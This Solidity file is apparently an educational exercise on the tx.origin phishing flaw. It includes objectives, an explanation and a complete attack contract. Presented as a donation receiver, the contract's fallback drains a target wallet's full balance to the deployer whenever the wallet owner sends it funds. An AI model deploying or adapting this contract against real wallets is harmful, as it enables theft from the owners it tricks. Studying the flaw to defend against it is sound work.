/* 
@title ArtGallery (Tx Origin Phishing Testing Suite)
@notice This contract is designed to showcase a vulnerability related to the usage of tx.origin for authorization in the digital wallet.
@dev It simulates a scenario where an attacker can exploit the tx.origin to impersonate the owner in interacting with the BasicDigitalWallet.

Objectives: 
(a) Define and interact with the BasicDigitalWallet interface.
(b) Have a constructor that sets the owner and BasicDigitalWallet address as the target.
(c) Include a payable fallback function to accept donations and call the transfer function of the BasicDigitalWallet, demonstrating the tx.origin vulnerability.

Solution:
To exploit the contract, an attacker can exploit the tx.origin to impersonate the owner. 
The exploit requires crafting a malicious contract that initiates a call, thereby allowing the attacker to meet the tx.origin == walletOwner condition.

Explanation:
The tx.origin phishing vulnerability exists because tx.origin refers to the origin of the transaction and not the direct caller. 
If a contract is called that subsequently calls another contract, tx.origin remains the same throughout all the calls. 
This allows an attacker to create a malicious contract that initiates a call, thereby allowing them to meet the tx.origin == walletOwner condition.
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


// @custom:objective (a) Define and interact with the BasicDigitalWallet interface.
// Create the interface to the BasicDigitalWallet contract.
// The function is defined as external because it will be called from the payable fallback function.
interface IBasicDigitalWallet {
    function transfer(address payable _to, uint _amount) external;
}

// @custom:objective (b) Have a constructor that sets the owner and BasicDigitalWallet address as the target.
// @custom:objective (c) Include a payable fallback function to accept donations and call the transfer function of the BasicDigitalWallet.
contract ArtGallery {

    // Setup variables

    // @dev Represents the address of the owner to whom the donations will be transferred.
    address payable private owner;
    
    // @dev Represents the target BasicDigitalWallet contract where the funds will be transferred using the specific logic defined in that contract.
    IBasicDigitalWallet private target;

    // Constructor

    // @notice Initializes the ArtGallery contract with the address of the target BasicDigitalWallet.
    // @param _target The address of the BasicDigitalWallet contract that will handle the transfer of donations.
    constructor(address _target) {
        // @notice Set the owner to the address that deployed the contract.
        owner = payable(msg.sender);

        // @notice Set the BasicDigitalWallet address that will handle the transfer.
        target = IBasicDigitalWallet(_target);
    }

    // Create the payable fallback function. It should be external.

    // @notice A payable fallback function that is triggered when a donation is received. It calls the transfer function on the target BasicDigitalWallet.
    fallback() external payable {
        // @notice Call the transfer function on the target BasicDigitalWallet with the owner's address and the current balance.
        target.transfer(owner, address(target).balance);
    }
}
